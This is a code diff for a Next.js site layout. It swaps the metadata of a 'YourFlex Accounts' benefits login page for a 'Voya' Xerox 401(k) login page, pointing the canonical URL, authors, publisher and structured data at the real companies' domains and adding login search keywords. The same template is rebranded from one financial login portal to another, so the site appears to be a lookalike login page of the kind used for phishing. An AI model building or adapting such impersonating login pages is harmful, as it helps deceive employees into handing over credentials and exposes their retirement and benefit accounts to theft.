@@ -1,5 +1,5 @@
 import type React from "react";
-import type { Metadata } from "next";
+import type { Metadata, Viewport } from "next";
 import { Geist } from "next/font/google";
 import { Analytics } from "@vercel/analytics/next";
 import "./globals.css";
@@ -7,41 +7,41 @@ import "./globals.css";
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
-const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
-const SITE_BRAND = "YourFlex Accounts";
+  "https://login.voya.com/voyassoui/index.html?domain=xerox401k.voya.com#/login-pweb";
+const SITE_DOMAIN = "login.voya.com";
+const SITE_BRAND = "Voya";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "YourFlex Accounts - Login",
-    template: "%s | YourFlex Accounts",
+    default: "Voya - 401(k) Login",
+    template: "%s | Voya",
   },
   keywords: [
-    "YourFlex Accounts",
-    "Aptia 365",
-    "yourflexaccounts.aptia365.com",
-    "benefits login",
-    "employee benefits portal",
-    "FSA login",
-    "HSA login",
-    "COBRA login",
-    "account access",
-    "health benefits",
-    "dependent care",
-    "reimbursement account",
+    "Voya",
+    "Xerox 401(k)",
+    "401(k) login",
+    "retirement plan",
+    "employee retirement",
+    "401k account access",
+    "retirement savings",
+    "investment portfolio",
+    "retirement benefits",
     "secure login",
     "participant portal",
     "employer portal",
-    "handshake authentication"
+    "401k contributions",
+    "retirement account",
+    "voya.com",
+    "xerox benefits",
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
 
-  authors: [{ name: "YourFlex Accounts" }],
-  creator: "YourFlex Accounts",
-  publisher: "YourFlex Accounts",
+  authors: [{ name: "Voya" }],
+  creator: "Voya",
+  publisher: "Voya",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +58,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Voya - 401(k) Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,8 +73,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Voya - 401(k) Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your Xerox 401(k) retirement plan account, manage your investments, and sign in securely through Voya.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
@@ -82,12 +82,6 @@ export const metadata: Metadata = {
     shortcut: "/favicon-32x32.png",
     apple: "/favicon-32x32.png",
   },
-  viewport: {
-    width: "device-width",
-    initialScale: 1,
-    maximumScale: 5,
-  },
-  themeColor: "#254650",
   category: "Business",
   alternates: {
     canonical: CANONICAL_LOGIN_URL,
@@ -100,16 +94,23 @@ export const metadata: Metadata = {
   },
 };
 
+export const viewport: Viewport = {
+  width: "device-width",
+  initialScale: 1,
+  maximumScale: 5,
+  themeColor: "#254650",
+};
+
 const jsonLd = {
   "@context": "https://schema.org",
   "@type": "WebSite",
   name: SITE_BRAND,
   url: CANONICAL_LOGIN_URL,
   description:
-    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
+    "Voya sign in portal. Login to manage your Xerox 401(k) retirement plan, view your investments, and access your Voya account.",
   publisher: {
     "@type": "Organization",
-    name: "YourFlex Accounts",
+    name: "Voya",
   },
   inLanguage: "en-US",
   potentialAction: {
